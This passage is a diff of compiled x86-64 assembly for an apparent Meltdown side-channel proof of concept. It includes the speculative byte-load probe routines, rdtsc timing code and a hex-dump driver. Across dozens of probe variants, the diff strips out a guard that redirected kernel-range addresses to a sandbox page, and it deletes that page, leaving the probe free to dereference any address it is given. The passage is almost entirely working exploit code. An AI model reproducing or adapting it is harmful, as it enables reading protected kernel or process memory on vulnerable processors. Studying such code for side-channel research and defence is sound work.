-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2867,9 +2306,6 @@ probe_one:
 .Lprobe_one_win0_var188:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2879,9 +2315,6 @@ probe_one:
 .Lprobe_one_win0_var189:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2891,9 +2324,6 @@ probe_one:
 .Lprobe_one_win0_var190:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2903,9 +2333,6 @@ probe_one:
 .Lprobe_one_win0_var191:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2915,9 +2342,6 @@ probe_one:
 .Lprobe_one_win0_var192:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2927,9 +2351,6 @@ probe_one:
 .Lprobe_one_win0_var193:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2939,9 +2360,6 @@ probe_one:
 .Lprobe_one_win0_var194:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2951,9 +2369,6 @@ probe_one:
 .Lprobe_one_win0_var195:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2963,9 +2378,6 @@ probe_one:
 .Lprobe_one_win0_var196:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2975,9 +2387,6 @@ probe_one:
 .Lprobe_one_win0_var197:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2987,9 +2396,6 @@ probe_one:
 .Lprobe_one_win0_var198:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2999,9 +2405,6 @@ probe_one:
 .Lprobe_one_win0_var199:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3011,9 +2414,6 @@ probe_one:
 .Lprobe_one_win0_var200:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3023,9 +2423,6 @@ probe_one:
 .Lprobe_one_win0_var201:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3035,9 +2432,6 @@ probe_one:
 .Lprobe_one_win0_var202:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3047,9 +2441,6 @@ probe_one:
 .Lprobe_one_win0_var203:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3059,9 +2450,6 @@ probe_one:
 .Lprobe_one_win0_var204:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3071,9 +2459,6 @@ probe_one:
 .Lprobe_one_win0_var205:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3083,9 +2468,6 @@ probe_one:
 .Lprobe_one_win0_var206:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3095,9 +2477,6 @@ probe_one:
 .Lprobe_one_win0_var207:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3107,9 +2486,6 @@ probe_one:
 .Lprobe_one_win0_var208:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3119,9 +2495,6 @@ probe_one:
 .Lprobe_one_win0_var209:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3131,9 +2504,6 @@ probe_one:
 .Lprobe_one_win0_var210:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3143,9 +2513,6 @@ probe_one:
 .Lprobe_one_win0_var211:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3155,9 +2522,6 @@ probe_one:
 .Lprobe_one_win0_var212:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3167,9 +2531,6 @@ probe_one:
 .Lprobe_one_win0_var213:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3179,9 +2540,6 @@ probe_one:
 .Lprobe_one_win0_var214:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3191,9 +2549,6 @@ probe_one:
 .Lprobe_one_win0_var215:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3203,9 +2558,6 @@ probe_one:
 .Lprobe_one_win0_var216:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3215,9 +2567,6 @@ probe_one:
 .Lprobe_one_win0_var217:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3227,9 +2576,6 @@ probe_one:
 .Lprobe_one_win0_var218:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3239,9 +2585,6 @@ probe_one:
 .Lprobe_one_win0_var219:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3251,9 +2594,6 @@ probe_one:
 .Lprobe_one_win0_var220:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3263,9 +2603,6 @@ probe_one:
 .Lprobe_one_win0_var221:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3275,9 +2612,6 @@ probe_one:
 .Lprobe_one_win0_var222:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3287,9 +2621,6 @@ probe_one:
 .Lprobe_one_win0_var223:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3299,9 +2630,6 @@ probe_one:
 .Lprobe_one_win0_var224:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3311,9 +2639,6 @@ probe_one:
 .Lprobe_one_win0_var225:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3323,9 +2648,6 @@ probe_one:
 .Lprobe_one_win0_var226:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3335,9 +2657,6 @@ probe_one:
 .Lprobe_one_win0_var227:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3347,9 +2666,6 @@ probe_one:
 .Lprobe_one_win0_var228:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3359,9 +2675,6 @@ probe_one:
 .Lprobe_one_win0_var229:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3371,9 +2684,6 @@ probe_one:
 .Lprobe_one_win0_var230:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3383,9 +2693,6 @@ probe_one:
 .Lprobe_one_win0_var231:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3395,9 +2702,6 @@ probe_one:
 .Lprobe_one_win0_var232:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3407,9 +2711,6 @@ probe_one:
 .Lprobe_one_win0_var233:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3419,9 +2720,6 @@ probe_one:
 .Lprobe_one_win0_var234:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3431,9 +2729,6 @@ probe_one:
 .Lprobe_one_win0_var235:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3443,9 +2738,6 @@ probe_one:
 .Lprobe_one_win0_var236:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3455,9 +2747,6 @@ probe_one:
 .Lprobe_one_win0_var237:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3467,9 +2756,6 @@ probe_one:
 .Lprobe_one_win0_var238:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3479,9 +2765,6 @@ probe_one:
 .Lprobe_one_win0_var239:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3491,9 +2774,6 @@ probe_one:
 .Lprobe_one_win0_var240:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3503,9 +2783,6 @@ probe_one:
 .Lprobe_one_win0_var241:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3515,9 +2792,6 @@ probe_one:
 .Lprobe_one_win0_var242:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3527,9 +2801,6 @@ probe_one:
 .Lprobe_one_win0_var243:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3539,9 +2810,6 @@ probe_one:
 .Lprobe_one_win0_var244:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3551,9 +2819,6 @@ probe_one:
 .Lprobe_one_win0_var245:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3563,9 +2828,6 @@ probe_one:
 .Lprobe_one_win0_var246:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3575,9 +2837,6 @@ probe_one:
 .Lprobe_one_win0_var247:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3587,9 +2846,6 @@ probe_one:
 .Lprobe_one_win0_var248:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3599,9 +2855,6 @@ probe_one:
 .Lprobe_one_win0_var249:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -3624,7 +2877,7 @@ __speculative_byte_load_exit:
 	movq	-2344(%rbp), %rax
 	movq	%rax, %rcx
 #APP
-# 118 "meltdownNew.c" 1
+# 120 "meltdownFrichetten.c" 1
 	mfence
 	lfence
 	rdtsc
@@ -3866,14 +3119,13 @@ dump_hex:
 .LFE13:
 	.size	dump_hex, .-dump_hex
 	.section	.rodata
-	.align 8
 .LC4:
-	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
-.LC5:
 	.string	"mmap() failed: %s\n"
 	.align 8
-.LC6:
+.LC5:
 	.string	"poke buffer: %p, page size: %i\n"
+.LC6:
+	.string	"Start address: 0x%016lx \n"
 	.text
 	.globl	main
 	.type	main, @function
@@ -3895,8 +3147,8 @@ main:
 	movq	%rax, -24(%rbp)
 	xorl	%eax, %eax
 	call	getpagesize@PLT
-	movl	%eax, -244(%rbp)
-	movl	$0, -248(%rbp)
+	movl	%eax, -248(%rbp)
+	movl	$0, -244(%rbp)
 	movq	$0, -232(%rbp)
 	movq	$0, -224(%rbp)
 	leaq	-208(%rbp), %rax
@@ -3916,42 +3168,13 @@ main:
 	movq	%rax, %rsi
 	movl	$11, %edi
 	call	sigaction@PLT
-	cmpl	$2, -260(%rbp)
-	jle	.L33
-	cmpl	$4, -260(%rbp)
-	jle	.L34
-.L33:
-	movq	-272(%rbp), %rax
-	movq	(%rax), %rax
-	movq	%rax, %rsi
-	leaq	.LC4(%rip), %rax
-	movq	%rax, %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$0, %eax
-	jmp	.L47
-.L34:
-	movq	-272(%rbp), %rax
-	addq	$8, %rax
-	movq	(%rax), %rax
-	movl	$16, %edx
-	movl	$0, %esi
-	movq	%rax, %rdi
-	call	strtoul@PLT
+	movq	test.0(%rip), %rax
 	movq	%rax, -232(%rbp)
-	movq	-272(%rbp), %rax
-	addq	$16, %rax
-	movq	(%rax), %rax
-	movl	$10, %edx
-	movl	$0, %esi
+	movq	test.0(%rip), %rax
 	movq	%rax, %rdi
-	call	strtoul@PLT
+	call	strlen@PLT
 	movq	%rax, -224(%rbp)
-	cmpl	$4, -260(%rbp)
-	jne	.L36
-	movl	$1, -248(%rbp)
-.L36:
-	movl	-244(%rbp), %eax
+	movl	-248(%rbp), %eax
 	sall	$8, %eax
 	cltq
 	movl	$0, %r9d
@@ -3963,37 +3186,43 @@ main:
 	call	mmap@PLT
 	movq	%rax, -216(%rbp)
 	cmpq	$-1, -216(%rbp)
-	jne	.L37
+	jne	.L33
 	call	__errno_location@PLT
 	movl	(%rax), %eax
 	movl	%eax, %edi
 	call	strerror@PLT
 	movq	%rax, %rsi
-	leaq	.LC5(%rip), %rax
+	leaq	.LC4(%rip), %rax
 	movq	%rax, %rdi
 	movl	$0, %eax
 	call	printf@PLT
 	movl	$-1, %eax
-	jmp	.L47
-.L37:
-	movl	-244(%rbp), %edx
+	jmp	.L34
+.L33:
+	movl	-248(%rbp), %edx
 	movq	-216(%rbp), %rax
+	movq	%rax, %rsi
+	leaq	.LC5(%rip), %rax
+	movq	%rax, %rdi
+	movl	$0, %eax
+	call	printf@PLT
+	movq	-232(%rbp), %rax
 	movq	%rax, %rsi
 	leaq	.LC6(%rip), %rax
 	movq	%rax, %rdi
 	movl	$0, %eax
 	call	printf@PLT
 	movq	$0, -240(%rbp)
-	jmp	.L38
-.L41:
-	cmpl	$0, -248(%rbp)
-	jne	.L39
+	jmp	.L35
+.L38:
+	cmpl	$0, -244(%rbp)
+	jne	.L36
 	cmpq	$0, -240(%rbp)
-	je	.L39
+	je	.L36
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	jne	.L39
+	jne	.L36
 	movq	-232(%rbp), %rdx
 	movq	-240(%rbp), %rax
 	addq	%rdx, %rax
@@ -4004,21 +3233,21 @@ main:
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	dump_hex
-.L39:
+.L36:
 	movq	-232(%rbp), %rdx
 	movq	-240(%rbp), %rax
 	leaq	(%rdx,%rax), %rcx
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rbx
-	movl	-244(%rbp), %edx
+	movl	-248(%rbp), %edx
 	movq	-216(%rbp), %rax
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	probe_one
 	movb	%al, -48(%rbp,%rbx)
-	cmpl	$0, -248(%rbp)
-	je	.L40
+	cmpl	$0, -244(%rbp)
+	je	.L37
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rdx
@@ -4028,39 +3257,39 @@ main:
 	movq	%rax, %rsi
 	movl	$1, %edi
 	call	write@PLT
-.L40:
+.L37:
 	addq	$1, -240(%rbp)
-.L38:
+.L35:
 	movq	-240(%rbp), %rax
 	cmpq	-224(%rbp), %rax
-	jb	.L41
-	cmpl	$0, -248(%rbp)
-	jne	.L42
+	jb	.L38
+	cmpl	$0, -244(%rbp)
+	jne	.L39
 	cmpq	$0, -240(%rbp)
-	je	.L42
+	je	.L39
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	je	.L43
+	je	.L40
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rdx
-	jmp	.L44
-.L43:
+	jmp	.L41
+.L40:
 	movl	$16, %edx
-.L44:
+.L41:
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	jne	.L45
+	jne	.L42
 	movq	-240(%rbp), %rax
 	subq	$1, %rax
 	andq	$-16, %rax
-	jmp	.L46
-.L45:
+	jmp	.L43
+.L42:
 	movq	-240(%rbp), %rax
 	andq	$-16, %rax
-.L46:
+.L43:
 	movq	-232(%rbp), %rcx
 	addq	%rcx, %rax
 	movq	%rax, %rcx
@@ -4068,8 +3297,8 @@ main:
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	dump_hex
-.L42:
-	movl	-244(%rbp), %eax
+.L39:
+	movl	-248(%rbp), %eax
 	sall	$8, %eax
 	movslq	%eax, %rdx
 	movq	-216(%rbp), %rax
@@ -4077,25 +3306,28 @@ main:
 	movq	%rax, %rdi
 	call	munmap@PLT
 	movl	$0, %eax
-.L47:
+.L34:
 	movq	-24(%rbp), %rdx
 	subq	%fs:40, %rdx
-	je	.L48
+	je	.L44
 	call	__stack_chk_fail@PLT
-.L48:
+.L44:
 	movq	-8(%rbp), %rbx
 	leave
 	.cfi_def_cfa 7, 8
 	ret
 	.cfi_endproc
-	.section	.bss
-	.p2align	12
-__gg_meltdown_sandbox:
-## Meltdown sandbox page (auto-generated)
-	.skip	4096
-	.text
 .LFE14:
 	.size	main, .-main
+	.section	.rodata
+.LC7:
+	.string	"Hmm, this does really work!"
+	.section	.data.rel.local,"aw"
+	.align 8
+	.type	test.0, @object
+	.size	test.0, 8
+test.0:
+	.quad	.LC7
 	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
 	.section	.note.GNU-stack,"",@progbits
 	.section	.note.gnu.property,"a"
